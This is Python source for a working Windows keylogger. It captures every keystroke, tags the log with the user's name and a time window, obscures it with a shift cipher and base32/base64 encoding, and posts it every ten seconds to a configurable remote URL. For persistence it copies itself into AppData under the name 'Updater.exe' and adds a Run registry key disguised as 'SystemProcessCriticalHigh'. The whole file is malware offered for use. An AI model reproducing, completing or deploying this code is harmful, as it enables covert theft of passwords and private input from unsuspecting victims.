import keyboard, os, subprocess, sys, shutil
import requests, base64
from threading import Timer
from datetime import datetime
from getpass import getuser

class Cipher:
    def encrypt(plain_text, key=16):
        encrypted = ""
        for c in plain_text:
            if c.isupper():
                c_index = ord(c) - ord('A')
                c_shifted = (c_index + key) % 26 + ord('A')
                c_new = chr(c_shifted)
                encrypted += c_new
            elif c.islower():
                c_index = ord(c) - ord('a') 
                c_shifted = (c_index + key) % 26 + ord('a')
                c_new = chr(c_shifted)
                encrypted += c_new
            elif c.isdigit():
                c_new = (int(c) + key) % 10
                encrypted += str(c_new)
            else:
                encrypted += c
        encrypted = base64.b64encode(base64.b32encode(bytes(encrypted, encoding='utf-8')))
        return encrypted

SEND_REPORT_EVERY = 10
EXEC_NAME = "Updater.exe"
POST_URL = ""
POST_KEY_NAME = ""
POST_EXPECTED_RESULT = ""

class Keylogger:
    def __init__(self, interval, POST_EXPECTED_RESULT, POST_KEY_NAME, POST_URL):
        self.interval = interval
        self.POST_EXPECTED_RESULT = POST_EXPECTED_RESULT
        self.POST_KEY_NAME = POST_KEY_NAME
        self.POST_URL = POST_URL
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def WebPOST(self):
        data = {f"{self.POST_KEY_NAME}": Cipher.encrypt(plain_text=self.log, key=16)}
        temp = 0
        while temp < 3:
            try:
                r = requests.post(self.POST_URL, data=data)
                if r.text == self.POST_EXPECTED_RESULT:
                    break
            except:
                pass
            temp += 1
        

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.log += str(getuser()) + f"\n{self.start_dt} - {self.end_dt}\n" 
            self.WebPOST()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

def run_at_startup():
    global EXEC_NAME
    location = os.environ["appdata"] + f"\\{EXEC_NAME}.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemProcessCriticalHigh /t REG_SZ /d "' + location + '"', shell=True)


if __name__ == "__main__":
    run_at_startup()
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, POST_EXPECTED_RESULT=POST_EXPECTED_RESULT, POST_KEY_NAME=POST_KEY_NAME, POST_URL=POST_URL)
    keylogger.start()


